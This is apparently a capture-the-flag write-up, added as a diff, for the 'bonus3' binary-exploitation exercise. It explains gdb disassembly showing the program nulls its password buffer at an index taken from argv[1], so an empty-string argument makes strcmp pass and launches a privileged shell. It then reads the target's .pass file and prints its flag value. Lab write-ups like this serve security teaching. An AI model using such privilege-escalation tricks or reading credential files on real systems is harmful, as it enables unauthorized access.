@@ -1,0 +1,44 @@
+- We run the program and we found that it takes 1 param.
+
+- We start disassembling the program and we found that it calls the fopen function to open a file which is "/home/user/end/.pass"
+
+$> gdb ./bonus3
+(gdb) disas main
+[...]
+   0x08048502 <+14>:	mov    edx,0x80486f0
+   0x08048507 <+19>:	mov    eax,0x80486f2
+   0x0804850c <+24>:	mov    DWORD PTR [esp+0x4],edx
+   0x08048510 <+28>:	mov    DWORD PTR [esp],eax
+   0x08048513 <+31>:	call   0x8048410 <fopen@plt>
+[...]
+
+(gdb) x/s 0x80486f2
+0x80486f2:	"/home/user/end/.pass"
+
+- After that, he read the content of this file and store it in a variable using fread function.
+
+   0x08048558 <+100>:	mov    DWORD PTR [esp+0xc],edx
+   0x0804855c <+104>:	mov    DWORD PTR [esp+0x8],0x42
+   0x08048564 <+112>:	mov    DWORD PTR [esp+0x4],0x1
+   0x0804856c <+120>:	mov    DWORD PTR [esp],eax
+   0x0804856f <+123>:	call   0x80483d0 <fread@plt>
+
+- After that, call the atoi function with argv[1] and pass it as an index to the return string from fread.
+
+   0x08048584 <+144>:	call   0x8048430 <atoi@plt>
+   0x08048589 <+149>:	mov    BYTE PTR [esp+eax*1+0x18],0x0 // pass[atoi(argv[1])] = 0;
+
+- And at the end call strcmp to compare the two arguments (pass: return form fread) and argv[1], if this comparison is equal to 0 the shell will be launched.
+
+
+- So the idea here is we need to make this comparison pass correctly, for that if we try to pass "" (empty string) to the program and after executing this instruction 
+
+0x08048589 <+149>:	mov    BYTE PTR [esp+eax*1+0x18],0x0 // pass[atoi(argv[1])] = 0;
+
+- The pass variable will be also an empty string, so when the strcmp compares the pass and argv[1] it will return 0 and launch the shell with success.
+
+$ ./bonus3 ""
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
